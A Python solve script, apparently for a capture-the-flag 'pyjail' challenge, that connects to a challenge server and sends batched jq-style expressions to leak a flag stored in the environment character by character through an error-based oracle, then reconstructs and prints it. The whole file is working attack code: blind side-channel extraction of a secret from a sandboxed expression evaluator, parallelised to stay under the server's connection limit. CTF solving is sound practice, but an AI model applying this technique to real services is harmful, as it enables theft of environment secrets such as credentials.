import socket
import json
import string
import time
from concurrent.futures import ThreadPoolExecutor

import solve_remote_live

RAW_CHAINS = json.loads(solve_remote_live.EMBEDDED_CHAINS_JSON)
CHAINS = {int(k): v for k, v in RAW_CHAINS.items()}
FEATURES = solve_remote_live.FEATURES

def predicate(ops):
    parts = []
    for op in ops:
        parts.append(op)
        parts.append("normals")
    return "|".join(parts)

def worker_query(group):
    try:
        s = socket.create_connection(("challs.pyjail.club", 20219), timeout=15)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        
        buf = b""
        while b"expr: " not in buf:
            chunk = s.recv(4096)
            if not chunk: break
            buf += chunk
        if b"expr: " in buf:
            buf = buf.split(b"expr: ", 1)[1]

        exprs = [item[5] for item in group]
        payload = ("\n".join(exprs) + "\n").encode()
        s.sendall(payload)
        
        answers = []
        token_re = solve_remote_live.TOKEN_RE
        while len(answers) < len(exprs):
            m = list(token_re.finditer(buf))
            if m:
                take = min(len(m), len(exprs) - len(answers))
                answers.extend(match.group(1).decode() for match in m[:take])
                buf = buf[m[take - 1].end():]
                if len(answers) == len(exprs):
                    break
                continue
            chunk = s.recv(65536)
            if not chunk: break
            buf += chunk

        s.close()
        return [(item, ans) for item, ans in zip(group, answers)]
    except Exception as e:
        print(f"[-] Worker error: {e}")
        return [(item, "error_err") for item in group]

def main():
    length = 122
    charset = string.ascii_lowercase + string.digits + "_"
    
    flag = ["?"] * length
    flag[0:5] = list("jail{")
    flag[-1] = "}"
    
    print("[*] Generating multi-feature candidate plan for 100% position coverage...")
    query_plan = [] # (pos, char, feat_idx, is_reverse, chain_val, expr)
    
    # We test features 0 to 4 (add, min, max, uniqadd)
    for pos in range(5, length - 1):
        for c in charset:
            v = ord(c)
            for fi in range(4):
                feat = FEATURES[fi]
                val_fwd = feat.evaluate(pos, v)
                if val_fwd in CHAINS:
                    pred = predicate(CHAINS[val_fwd])
                    expr = f"env|flatten|sort|last|explode|tostream|{feat.suffix}|{pred}|error"
                    query_plan.append((pos, c, fi, False, val_fwd, expr))
                
                val_rev = feat.evaluate(length - 1 - pos, v)
                if val_rev in CHAINS:
                    pred = predicate(CHAINS[val_rev])
                    expr = f"env|flatten|sort|last|explode|reverse|implode|explode|tostream|{feat.suffix}|{pred}|error"
                    query_plan.append((pos, c, fi, True, val_rev, expr))

    print(f"[+] Total query plan items: {len(query_plan)}")

    # Group into batches of 32
    batch_size = 32
    groups = [query_plan[i : i + batch_size] for i in range(0, len(query_plan), batch_size)]

    t0 = time.time()
    results = []
    
    # Run with 2 parallel socket connections (JAIL_CONNS_PER_IP = 2 limit)
    with ThreadPoolExecutor(max_workers=2) as executor:
        futures = [executor.submit(worker_query, group) for group in groups]
        for f in futures:
            results.extend(f.result())

    t1 = time.time()
    print(f"[+] All queries finished in {t1 - t0:.2f}s!")

    # Analyze matches per position
    pos_matches = {pos: set() for pos in range(5, length - 1)}
    
    for (pos, c, fi, is_rev, val, expr), ans in zip(query_plan, [r[1] for r in results]):
        if ans == "error":
            pos_matches[pos].add(c)

    # Reconstruct flag
    for pos in range(5, length - 1):
        matches = pos_matches[pos]
        if len(matches) == 1:
            flag[pos] = list(matches)[0]
        elif len(matches) > 1:
            print(f"[!] Pos {pos:3d}: candidates {matches}")
        else:
            print(f"[-] Pos {pos:3d}: no match")

    final_flag = "".join(flag)
    print("\n" + "="*80)
    print(f"[+] RECOVERED FLAG: {final_flag}")
    print("="*80)

if __name__ == "__main__":
    main()
